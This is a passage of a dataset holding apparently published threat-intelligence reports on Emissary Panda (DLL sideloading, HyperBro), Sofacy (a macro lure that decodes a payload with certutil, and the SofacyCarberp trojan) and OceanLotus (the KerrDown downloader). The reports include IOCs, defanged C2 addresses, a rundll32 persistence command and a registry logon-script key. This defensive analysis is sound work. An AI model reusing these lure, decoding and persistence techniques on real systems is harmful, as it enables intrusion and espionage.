                "The commands available within the HyperBro tools command handler"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Unknown Sideloaded Payloads"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Table 2 and 4 above include two legitimate executables used for DLL sideloading, specifically the plugin_host.exe application for Sublime Text and the CreateMedia.exe application from Microsoft's System Center 2012 Configuration Manager.",
                "The plugin_host.exe application imports several functions from a library named python33, which is how the legitimate application sideloads the malicious DLL named PYTHON33.dll.",
                "This is the first instance we have observed Sublime Texts plugin host application used for sideloading.",
                "Like the plugin host application, the CreateMedia.exe application imports several functions from a library named CreateTsMediaAdm that is leveraged to load the malicious DLL named CreateTsMediaAdm.dll."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The PYTHON33.dll and the CreateTsMediaAdm.dll libraries are very similar with BinDiff providing a 97% similarity with 99% confidence between the two DLLs.",
                "The code diff in Figure 8 shows the decryption routine in PYTHON33.dll (right) and CreateTsMediaAdm.dll (left), both of which use an eight byte XOR key to decrypt a piece of shikata_ga_nai obfuscated shellcode.",
                "The shellcode is responsible for patching the entry point of the legitimate application to call another function in the shellcode that is responsible for loading a file with the library name with an .hlp extension (PYTHON33.hlp or CreateTsMediaAdm.hlp)."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 8.",
                "Code comparison between the sideloaded CreateTsMediaAdm.dll and PYTHON33.dll files uploaded to two webshells"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Unfortunately, we do not have access to the PYTHON33.hlp or CreateTsMediaAdm.hlp files, so we do not know the final payload loaded by either of these DLLs.",
                "However, using NCC Groups research published in May 2018, we were able to discover code overlaps between these DLLs and a sideloaded DLL that ran the SysUpdate tool that the NCC group has associated with an Emissary Panda campaign.",
                "Figure 9 shows a code comparison between the PYTHON33.dll (right) and inicore_v2.3.30.dll (left) (SHA256: 4d65d371a789aabe1beadcc10b38da1f998cd3ec87d4cc1cfbf0af014b783822), which was sideloaded to run the SysUpdate tool in a previous Emissary Panda campaign.",
                "The code overlaps below include the same technique to find the entry point of the loading executable and decrypting the first piece of shellcode used to patch the entry point."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 9.",
                "Code comparison between the sideloaded PYTHON33.dll uploaded to webshell and the inicore_v2.3.30.dll file sideloaded in previous Emissary Panda attacks"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Conclusion"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Emissary Panda threat group loaded the China Chopper webshell onto SharePoint servers at two Government organizations in the Middle East, which we believe with high confidence involved exploiting a remote code execution vulnerability in SharePoint tracked in CVE-2019-0604.",
                "According to Microsofts advisory, this vulnerability was patched on March 12, 2019 and we first saw the webshell activity on April 1, 2019.",
                "This suggests that the threat group was able to quickly leverage a known vulnerability to exploit Internet facing servers to gain access to targeted networks."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Once the adversary established a foothold on the targeted network, they used China Chopper and other webshells to upload additional tools to the SharePoint server to dump credentials, perform network reconnaissance and pivot to other systems.",
                "We believe the actors pivoted to other systems on the network using stolen credentials and by exploiting the CVE-2017-0144 (EternalBlue) vulnerability patched in MS17-010.",
                "We also observed the actors uploading legitimate tools that would sideload DLLs, specifically the Sublime Text plugin host and the Microsofts Create Media application, both of which we had never seen used for DLL sideloading before."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Palo Alto Networks customers are protected by:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Palo Alto Networks has shared our findings, including file samples and indicators of compromise, in this report with our fellow Cyber Threat Alliance members.",
                "CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors.",
                "For more information on the Cyber Threat Alliance, visit www.cyberthreatalliance.org."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "IOCs"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Webshells SHA256"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "006569f0a7e501e58fe15a4323eedc08f9865239131b28dc5f95f750b4767b38"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "2feae7574a2cc4dea2bff4eceb92e3a77cf682c0a1e78ee70be931a251794b86"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "d1ab0dff44508bac9005e95299704a887b0ffc42734a34b30ebf6d3916053dbe"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "6b3f835acbd954af168184f57c9d8e6798898e9ee650bd543ea6f2e9d5cf6378"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Malicious HackTools and Payloads SHA256"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "88027a44dc82a97e21f04121eea2e86b4ddf1bd7bbaa4ad009b97b50307570bd"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "738128b4f42c8d2335d68383d72734130c0c4184725c06851498a4cf0374a841"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "3bca0bb708c5dad1c683c6ead857a5ebfa15928a59211432459a3efa6a1afc59"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "29897f2ae25017455f904595872f2430b5f7fedd00ff1a46f1ea77e50940128e"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "d0df8e1dcf30785a964ecdda9bd86374d35960e1817b25a6b0963da38e0b1333"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "a18326f929229da53d4cc340bde830f75e810122c58b523460c8d6ba62ede0e5"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "090cefebef655be7f879f2f14bd849ac20c4051d0c13e55410a49789738fad98"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "7eea6e15bb13a3b65cca9405829123761bf7d12c6dc3b81ce499d8f6a0b25fb7"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "38fa396770e0ecf60fe1ce089422283e2dc8599489bd18d5eb033255dd8e370c"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "4a26ec5fd16ee13d869d6b0b6177e570444f6a007759ea94f1aa18fa831290a8"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "b2b2e900aa2e96ff44610032063012aa0435a47a5b416c384bd6e4e58a048ac9"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "475c7e88a6d73e619ec585a7c9e6e57d2efc8298b688ebc10a3c703322f1a4a7"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "9f5f3a9ce156213445d08d1a9ea99356d2136924dc28a8ceca6d528f9dbd718b"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "c9d5dc956841e000bfd8762e2f0b48b66c79b79500e894b4efa7fb9ba17e4e9e"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "a6cad2d0f8dc05246846d2a9618fc93b7d97681331d5826f8353e7c3a3206e86"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "e781ce2d795c5dd6b0a5b849a414f5bd05bb99785f2ebf36edb70399205817ee"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "d0df8e1dcf30785a964ecdda9bd86374d35960e1817b25a6b0963da38e0b1333"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "06510504f30feb1adc7e423d5a24e67e5b97acbfafe40f253a054be8b1c4e8d7"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "b279a41359367408c627ffa8d80051ed0f04c76fbf6aed79b3b2963203e08ade"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "7eea6e15bb13a3b65cca9405829123761bf7d12c6dc3b81ce499d8f6a0b25fb7"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "04f48ed27a83a57a971e73072ac5c769709306f2714022770fb364fd575fd462"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "090cefebef655be7f879f2f14bd849ac20c4051d0c13e55410a49789738fad98"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "38fa396770e0ecf60fe1ce089422283e2dc8599489bd18d5eb033255dd8e370c"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "2dde8881cd9b43633d69dfa60f23713d7375913845ac3fe9b4d8a618660c4528"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "HyperBro",
                "C2"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxps://185.12.45[.]134:443/ajax"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "185.12.45[.]134"
            ]
        }
    ],
    "00a93d0051bcf455cceb1c142d053a260f1fb834": [
        {
            "type": "paragraph",
            "content": [
                "The Sofacy group (AKA APT28, Fancy Bear, STRONTIUM, Sednit, Tsar Team, Pawn Storm) is a well-known adversary that remains highly active in the new calendar year of 2018.",
                "Unit 42 actively monitors this group due to their persistent nature globally across all industry verticals.",
                "Recently, we discovered a campaign launched at various Ministries of Foreign Affairs around the world.",
                "Interestingly, there appear to be two parallel efforts within the campaign, with each effort using a completely different toolset for the attacks.",
                "In this blog, we will discuss one of the efforts which leveraged tools that have been known to be associated with the Sofacy group.\n\nAttack Details\nAt the beginning of February 2018, we discovered an attack targeting two government institutions related to foreign affairs.",
                "These entities are not regionally congruent, and the only shared victimology involves their organizational functions.",
                "Specifically, one organization is geographically located in Europe and the other in North America.",
                "The initial attack vector leveraged a phishing email (seen in Figure 1), using the subject line of Upcoming Defense events February 2018 and a sender address claiming to be from Jane's 360 defense events <events@ihsmarkit.com>.",
                "Janes by IHSMarkit is a well-known supplier of information and analysis often times associated with the defense and government sector.",
                "Analysis of the email header data showed that the sender address was spoofed and did not originate from IHSMarkit at all.",
                "The lure text in the phishing email claims the attachment is a calendar of events relevant to the targeted organizations and contained specific instructions regarding the actions the victim would have to take if they had trouble viewing the document."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 1 Spear-phishing email used in the attack campaign"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The attachment itself is an Microsoft Excel XLS document that contains malicious macro script.",
                "The document presents itself as a standard macro document but has all of its text hidden until the victim enables macros.",
                "Notably, all of the content text is accessible to the victim even before macros are enabled.",
                "However, a white font color is applied to the text to make it appear that the victim must enable macros to access the content.",
                "Once the macro is enabled, the content is presented via the following code:\nActiveSheet.Range(\"a1",
                ":c54\").Font.Color = vbBlack\nThe code above changes the font color to black within the specified cell range and presents the content to the user.",
                "On initial inspection, the content appears to be the expected legitimate content, however, closer examination of the document shows several abnormal artifacts that would not exist in a legitimate document.",
                "Figure 2 below shows how the delivery document initially looks and the transformation the content undergoes as the macro runs."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 2 Delivery document before and after the macro is run"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Delivery Document\nAs mentioned in a recent ISC diary entry, the macro gets the contents of cells in column 170 in rows 2227 to 2248 to obtain the base64 encoded payload, which can be seen in the following screenshot:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 3 Delivery Document showing base64 encoded payload"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The macro prepends the string -----BEGIN CERTIFICATE----- to the beginning of the base64 encoded payload and appends -----END CERTIFICATE----- to the end of the data.",
                "The macro then writes this data to a text file in the C:\\Programdata folder using a random filename with the .txt extension.",
                "The macro then uses the command certutil -decode to decode the contents of this text file and outputs the decoded content to a randomly named file with a .exe extension in the C:\\Programdata folder.",
                "The macro sleeps for two seconds and then executes the newly dropped executable.",
                "The newly dropped executable is a loader Trojan responsible for installing and running the payload of this attack.",
                "We performed a more detailed analysis on this loader Trojan, which readers can view in this report's appendix.",
                "Upon execution, the loader will decrypt the embedded payload (DLL) using a custom algorithm, decompress it and save it to the following file:\n%LOCALAPPDATA%\\cdnver.dll\nThe loader will then create the batch file %LOCALAPPDATA%\\cdnver.bat, which it will write the following:\nstart rundll32.exe \"C:\\Users\\user\\AppData\\Local\\cdnver.dll\",#1\nThe loader Trojan uses this batch file to run the embedded DLL payload.",
                "For persistence, the loader will write the path to this batch file to the following registry key, which will run the batch file each time the user logs into the system:\nHKCU\\Environment\\UserInitMprLogonScript\nThe cdnver.dll payload installed by the loader executable is a variant of the SofacyCarberp payload, which is used extensively by the Sofacy threat group.",
                "Overall, SofacyCarberp does initial reconnaissance by gathering system information and sending it to the C2 server prior to downloading additional tools to the system.",
                "This variant of SofacyCarberp was configured to use the following domain as its C2 server:\ncdnverify[.]net\nThe loader and the SofacyCarberp sample delivered in this attack is similar to samples we have analyzed in the past but contains marked differences.",
                "These differences include a new hashing algorithm to resolve API functions and to find running browser processes for injection, as well as changes to the C2 communication mechanisms as explained in detail within the appendix.\n\nOpen-source Delivery Document Generator\nIt appears that Sofacy may have used an open-source tool called Luckystrike to generate the delivery document and/or the macro used in this attack.",
                "Luckystrike, which was presented at DerbyCon 6 in September 2016, is a Microsoft PowerShell-based tool that generates malicious delivery documents by allowing a user to add a macro to an Excel or Word document to execute an embedded payload.",
                "We believe Sofacy used this tool, as the macro within their delivery document closely resembles the macros found within Luckystrike.",
                "To confirm our suspicions, we generated a malicious Excel file with Luckystrike and compared its macro to the macro found within Sofacy's delivery document.",
                "We found that there was only one difference between the macros besides the random function name and random cell values that the Luckystrike tool generates for each created payload.",
                "The one non-random string difference was the path to the \".txt\" and \".exe\" files within the command \"certutil -decode\", as the Sofacy document used \"C:\\Programdata\\\" for the path whereas the Luckystrike document used the path stored in the Application.",
                "UserLibraryPath environment variable.",
                "Figure 3 below shows a diff with the LuckyStrike macro on the left and Sofacy macro on the right, where everything except the file path and randomly generated values in the macro are exactly the same, including the obfuscation attempts that use concatenation to build strings."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 4 Diff of macros in Luckystrike generated document (left) and Sofacy's delivery document (right)"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Discovery and relationships\nWith much of our research, our initial direction and discovery of emerging threats is generally some combination of previously observed behavioral rulesets or relationships.",
                "In this case, we had observed a strange pattern emerging from the Sofacy group over the past year within their command and control infrastructure.",
                "Patterning such as reuse of WHOIS artifacts, IP reuse, or even domain name themes are common and regularly used to group attacks to specific campaigns.",
                "In this case, we had observed the Sofacy group registering new domains, then placing a default landing page which they then used repeatedly over the course of the year.",
                "No other parts of the C2 infrastructure amongst these domains contained any overlapping artifacts.",
                "Instead, the actual content within the body of the websites was an exact match in each instance.",
                "Specifically, the strings 866-593-54352 (notice it is one digit too long), 403-965-2341, or the address 522 Clematis.",
                "Suite 3000 was repeatedly found in each instance.",
                "ThreatConnect had made the same observation regarding this patterning in September 2017."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 5 Default landing page for cdnverify.net domain"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 6 Default landing page for hotfixmsupload.com domain"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Hotfixmsupload[.]com is particularly interesting as it has been identified as a Sofacy C2 domain repeatedly, and was also brought forth by Microsoft in a legal complaint against STRONTIUM (Sofacy) as documented here.",
                "Leveraging this intelligence allowed us to begin predicting potential C2 domains that would eventually be used by the Sofacy group.",
                "In this scenario, the domain cdnverify[.]net was registered on January 30, 2018 and just two days later, an attack was launched using this domain as a C2.\n\nConclusion\nThe Sofacy group should no longer be an unfamiliar threat at this stage.",
                "They have been well documented and well researched with much of their attack methodologies exposed.",
                "They continue to be persistent in their attack campaigns and continue to use similar tooling as in the past.",
                "This leads us to believe that their attack attempts are likely still succeeding, even with the wealth of threat intelligence available in the public domain.",
                "Application of the data remains challenging, and so to continue our initiative of establishing playbooks for adversary groups, we have added this attack campaign as the next playbook in our dataset.",
                "Palo Alto Networks customers are protected from this threat by:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "IOCs\n\nSHA256\nff808d0a12676bfac88fd26f955154f8884f2bb7c534b9936510fd6296c543e8\n12e6642cf6413bdf5388bee663080fa299591b2ba023d069286f3be9647547c8\ncb85072e6ca66a29cb0b73659a0fe5ba2456d9ba0b52e3a4c89e86549bc6e2c7\n23411bb30042c9357ac4928dc6fca6955390361e660fec7ac238bbdcc8b83701\n\nDomains\nCdnverify[.]net\n\nEmail Subject\nUpcoming Defense events February 2018\n\nFilename\nUpcoming Events February 2018.xls"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Appendix"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Loader Trojan\nThe payload dropped to the system by the macro is an executable that is responsible for installing and executing a dynamic link library (DLL) to the system.",
                "This executable contains the same decryption algorithm as the loader we analyzed in the DealersChoice attacks in late 2016.",
                "The loader has several coding features that make it interesting.",
                "For example, upon execution, the loader attempts to load the following library: api-ms-win-core-synch-l1-2-0.dll.",
                "This DLL is part of the Universal Windows Platform app to Windows 10.",
                "Typically, a developer would not link directly to this file, but to WindowsApp.lib, which gives access to the underlying APIs.",
                "It appears the loader included definitions of wrappers for Windows API functions that cannot be called directly because they are not supported on all operating systems.",
                "Upon execution, the loader will decrypt the embedded payload (DLL) using a custom algorithm followed by decompressing it using the RtlDecompressBuffer API.",
                "This API is normally used for Windows drivers, but there is nothing to prevent a userland process from using it, and the parameters are documented on MSDN.",
                "The compression algorithm used is LZNT1 with maximum compression level.",
                "The payload is decrypted using a starting 10-byte XOR key of: 0x3950BE2CD37B2C7CCBF8.",
                "Once decrypted, the data is then passed to the decompression routine.",
                "The payload is in the loader at file offset: 0x19880 - 0x1F23C size of 0x59BD.",
                "The payload can be decrypted and decompressed with the following Python script:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The loader will drop the following files in the %LOCALAPPDATA% file path:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "To evade observable detection from Windows explorer, file attributes are set to hidden.",
                "%LOCALAPPDATA% would be the user's path from the user who launched the executable, i.e., C:\\Users\\user\\AppData\\Local where the user would contain the users logon account.",
                "To execute the dropped DLL, the loader first checks the integrity level of the executing process, and if it does not have the necessary permissions, the loader will enumerate the systems processes searching for explorer.exe.",
                "This process was most likely chosen as it typically runs with administrator privileges.",
                "The loader will attempt to use the permission of explorer.exe to execute the dropped DLL via CreateProcessAsUser.",
                "If the user who executed the loader is admin or has sufficient privileges this step is skipped.",
                "The execution is handled using the Windows rundll32.exe program and calls the DLLs export via ordinal number 1.",
                "Example:\nstart rundll32.exe \"C:\\Users\\user\\AppData\\Local\\cdnver.dll\",#1\nFor persistence, the loader will add the following registry key UserInitMprLogonScript to HKCU \\Environment with the following value:\nC:\\Users\\user\\AppData\\Local\\cdnver.bat\nThis entry would cause the batch file to be executed any time the user logs on.",
                "The batch file contains the following information:\nstart rundll32.exe \"C:\\Users\\user\\AppData\\Local\\cdnver.dll\",#1\nThe use of the UserInitMprLogonScript is not new to Sofacy, as Mitres ATT&CK framework shows Sofacys use of this registry key as an example of the Logon Scripts persistence technique.",
                "SofacyCarberp Payload\nThe DLL delivered in these attacks is a variant of the SofacyCarberp payload, which is used extensively by the Sofacy threat group.\n\nAPI Resolution\nPrevious versions of this Trojan used code taken from the leaked Carberp source code, which mainly involved Carberp's code used to resolve API functions.",
                "However, this version of SofacyCarberp uses a hashing algorithm to locate the correct loaded DLL based on its BaseDLLName in order to manually load API functions.",
                "It does so by loading the PEB, then accesses the _PEB_LDR_DATA structure and then obtains the unicode string for BaseDllName in the InLoadOrderModuleList.",
                "It treats this unicode string as an ASCII string by skipping every other byte then gets the lowercase version of the string.",
                "It then subjects the resulting string of lowercase characters to a hashing algorithm and checks the resulting hash to a hardcoded value.",
                "The following Python script shows the algorithm used to determine the hashed values:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The following is a list of hardcoded values used to find the correct loaded DLL:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "It specifically looks for the following APIs based on its hash:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Injecting into Browsers\nThe Trojan will use the same hashing algorithm for API resolution to find browser processes running on the system with the intention of injecting code into the browser to communicate with its C2 server.",
                "The use of this hashing algorithm differs from previous variants of SofacyCarberp, as previously reported by ESET.",
                "To begin the code injection, the Trojan calls the ZwQuerySystemInformation function, specifically requesting for the data associated with SystemProcessInformation.",
                "The result is a structure named SYSTEM_PROCESS_INFORMATION, which the Trojan will access the Unicode string in the field ImageName (offset 0x3c).",
                "The Trojan then subjects this unicode string in ASCII format to the hashing algorithm, looking for the following:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Trojan will attempt to inject code into these browsers to carry out its C2 communications.",
                "To carry out C2 communications via injected code in a remote process, the injected code reaches out to the C2 server and saves the response to a memory mapped file named SNFIRNW.",
                "The Trojan uses a custom communication protocol within this mapped file, but at a high level the Trojan will continually look for data within the mapped SNFIRNW file and process the data in the same manner as if it communicated with the C2 server within its own process.\n\nCommand and Control Communications\nIn addition to being able to communicate with its C2 server from code injected into a web browser, the Trojan can also carry out the same communication process within its own process.",
                "The C2 communication uses HTTPS and specifically sets the following flags to do so in a manner to allow invalid certificates:\nSECURITY_FLAG_IGNORE_CERT_DATE_INVALID|SECURITY_FLAG_IGNORE_CERT_CN_INVALID|SECURITY_FLAG_IGNORE_UNKNOWN_CA|SECURITY_FLAG_IGNORE_REVOCATION\nThe initial request sent from the Trojan is to google.com, likely as an internet connectivity check."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 7 Initial request from SofacyCarberp Trojan to Google to check for Internet access"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "As seen in the activity above, the Trojan issues a POST request to a URL that contains randomly sized and randomly generated strings.",
                "The URL also contains a randomly chosen string from the following list:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This list of strings differs from previously analyzed SofacyCarberp samples, such as the variant discussed in our June 2016 blog New Sofacy Attacks Against US Government Agency that chose from a list of strings .xml, .pdf, .htm or .zip.",
                "The value for the one parameter, specifically WrLqG1kMJXpgID1rODM= is base64 encoded ciphertext that decrypts to the string UihklEpz4V, which is hardcoded in the Trojan.",
                "The algorithm used to encrypt the data in the URL the same algorithm as used in previous SofacyCarberp samples we have analyzed.",
                "The data in the POST request is the base64 encoded user-agent seen in the request.",
                "After establishing that the system has Internet access, the Trojan will gather detailed system information and send it to the C2 server.",
                "The gathered information includes a unique identifier based on the storage volume serial number (id field), a list of running processes, network interface card information, the storage device name (disk field), the Trojan's build identifier (build field, specifically 0x9104f000), followed by a screenshot of the system (img field).",
                "The screenshot functionality in this Trojan is rather interesting, as instead of using Windows APIs to take a screenshot, the Trojan's code simulates the user pressing the \"Take Screenshot\" key (VK_SCREENSHOT) on the keyboard which saves the screenshot to the clipboard.",
                "The Trojan then accesses the data in the clipboard and converts it to a JPG image to include in this HTTP request.",
                "All of this data is encrypted, base64 encoded and sent to the C2 server in a HTTP POST to a URL that a similar structure as the initial internet connectivity check."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 8 HTTP POST from SofacyCarberp to C2 server with system information"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The SofacyCarberp Trojan parses the C2 servers response to the request for data that the Trojan will then use to download a secondary payload to the system.",
                "The Trojan looks in the response data for sections between the tags [file] and [/file] and [settings] and [/settings], which we have observed in other SofacyCarberp samples we have analyzed.",
                "However, this particular variant also contains another section with the tags [shell] and [/shell].",
                "The Trojan parses these sections for specific fields that dictate how the Trojan will operate, including where the Trojan will save the downloaded file, how the Trojan runs the secondary payload and what C2 location the Trojan should communicate with.",
                "The following fields are parsed by the Trojan:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The data in the shell section specified in the shell field is base64 encoded data that decodes to raw assembly.",
                "We surmise this fact based on the Trojan using the base64 decoded data to create a local thread, which suggests that the provided data can be any position independent code or shellcode."
            ]
        }
    ],
    "ad53b33c88e0f0b9923517037531aaa3734bfc96": [
        {
            "type": "paragraph",
            "content": [
                "OceanLotus(AKA",
                "APT32)is a threat actor group known to be one of the most sophisticated threat actorsoriginating out of south eastAsia.",
                "Multiple attack campaignshave beenreportedby number of security organizations in the last couple of years,documentingthe tools and tactics used by the threat actor.",
                "WhileOceanLotus targets are global, their operations are mostly active within the APAC region which encompasses targeting private sectors across multiple industries, foreign governments, activists,anddissidents connected to Vietnam."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This blog will cover a new custom downloader malware familyweve named KerrDownwhichOceanLotushave been actively using since at leastearly2018.We also showhow thejaccard-indexalgorithmwas used to quickly find similaritiesbetween the newKerrDownmalware family within our datasets.",
                "This method has proven to be very useful to extract similarities from large sample datasets andconnecting attack campaignstogether.Given thelarge number ofKerrDownsamplesfound,we were also able todiscern possible patterns inOceanLotusworking hoursand days of a week which is discussed in the later sectionsof this blog."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We identifiedtwo methods to delivertheKerrDowndownloaderto targets.",
                "One is using the Microsoft Office Document withamalicious macroand the other isRARarchivewhichcontainsalegitimate program withDLL side-loading.",
                "ForRAR archive files, the file names usedto trick targets areallin Vietnameseas shown in Figure 11.Our analysis shows that the primary targets of the ongoing campaign discussed in this blog are either in Vietnam or Vietnamese speaking individuals."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Our analysis began with an active mime document, something we've seen OceanLotus use before but this time involving a new payload, KerrDown.",
                "The lure hash is"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "(SHA256:89e19df797481ae2d2c895bcf030fe19e581976d2aef90c89bd6b3408579bfc3)"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 1 below showsasnapshot of the lure file.",
                "Once the victim opens the lure document,which includes an image file with a message in Vietnamesewhichthatasks the victim to enable macros to view the contents of the file.",
                "At first glancethe document may look like thereisno other content other than the notification to enable macros.",
                "However,acloser look reveals two differentbase64blobs inserted in the page in separate tables and the font size has been changed to 1 which may deceive victims to overlook the content.",
                "Another reason for this technique maybe that many automated tools are able to detect the presence of an embedded binary within the streams of such files and this technique may allow them to go undetected."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure1:Lure document"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Once we increase the font size, thebase64blobs are visible in two different tables.",
                "Once decoded you can see the MZ header of thePEDLLat the beginning of each table, as shown inFigure 2."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure2:Base64encodedpedllfilesembedded as text in the document."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 3 shows a code excerpt from the embedded macro that checks whichbase64blob should be decoded based on theiCheckvariable, aBoolean valuewhich isset to true if thevictim system is running on a 64-bit systemand false on a 32-bit system.",
                "If the system is found to be 64-bit, thebase64encoded blob onthe leftis decodedotherwisethebase64encoded blob onthe right is decoded."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure3:Base64blob selection based on system check"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We also noticed that theactors reused theVBS decode functionpublished byMotobit.",
                "Figure 4 shows the comparison between thebase64function used in the macro code and the VBSbase64decoder function published byMotobit."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure4:Base64decoder comparison"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Once we decoded and extracted bothDLLfiles from the document weuseda similarity analysis algorithmusingtheJaccard indextocheck the binaries against known set of malware families used byOceanLotuswhich yielded no matches with any previousOceanLotusmalware families.",
                "However, we were able to find multiple other samples in our datasets usingtheimphashvalueof theKerrDownsamplesandthe accompanyingC2domains.",
                "Given thehighnumber of samples found, weagainusedasimilarity analysis algorithm usingJaccard Indexto extract similarities between all the samples found.",
                "At this stage we were not sure if theDLLfiles were a backdoor or hadany other functionality.",
                "Hence, we includedafew otherknownOceanLotusmalware family samplesused no earlier than 2017to our similarity test,and inmost cases samples which were final payloadsdropped in victim machines.",
                "One of the main objectiveswas to quickly discernifKerrDowncould have been variants of the known malware families we have been tracking or wasOceanLotusemploying a new malware family in their playbooks and in the recent campaigns.",
                "Plotting theJaccard index results usingnetworkxwe can quickly visualize the similarities extracted.",
                "As you can see from Figure 5, there is a thick cluster of samples at the top right of thenetworkxgraph which did not have any similarities with the other knownOceanLotusmalware family samples.",
                "Therefore, this observation was helpful for us tounderstand that the samples we were looking into were likely a new malware family being employed by theOceanLotusgroupat the time of analysis,which wehave now namedKerrDown."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure5: Similarity analysis using Jaccard Index"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "As discussed in the delivery documentanalysis above,depending on the OS architecture either of the embeddedKerrDownDLLswill be dropped in the victim machine.",
                "TheDLLis dropped in the directory location Users\\Administrator\\AppData\\Roaming\\as main_background.png.",
                "The DLL retrieves the payload fromtheURL, decrypts it by using DES algorithm andexecute itinthememory.",
                "Therefore, it is observed that only theKerrDownDLLdownloader is saved in the system and the payload directly gets executed in the memory without being written in the system.",
                "Table1shows theURLthe downloader will attempt to download the payload from depending on theOS architecture of the victim machine."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Table1",
                ":PayloadDLLselection based on architecture"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The link to the final payload ofKerrDownwas still active during the time of analysis and hence we were able to download a copy which turned out to be a variant of CobaltStrikeBeacon.",
                "Cybereason alsopublishedpreviously onOceanLotususing CobaltStrike in their campaignsandit is interesting to see the use of a new downloader malware family being used tostilldeliver the final payload of CobaltStrike.",
                "As we can see in this case, the purpose of the malware is to download and execute the CobaltStrike Beacon payload in memory.",
                "Though CobaltStrike is a commercial penetration testing tool,various threat actorsareknown to have used it in their campaigns."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "While investigatingKerrDownwe found multipleRARfiles containinga variant of themalware.",
                "We haventyetidentifiedthedeliverymethodortargets ofthisvariant.",
                "The attacker changedthe downloader code by adding morestagesandhidingeach stage by compression and encryption.",
                "They alsochangedthe wayto execute the malicious code fromanOfficemacro to theDLLside-loading technique throughalegitimate program."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "TheRARarchive"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "(SHA256:040abac56542a2e0f384adf37c8f95b2b6e6ce3a0ff969e3c1d572e6b4053ff3)"
            ]
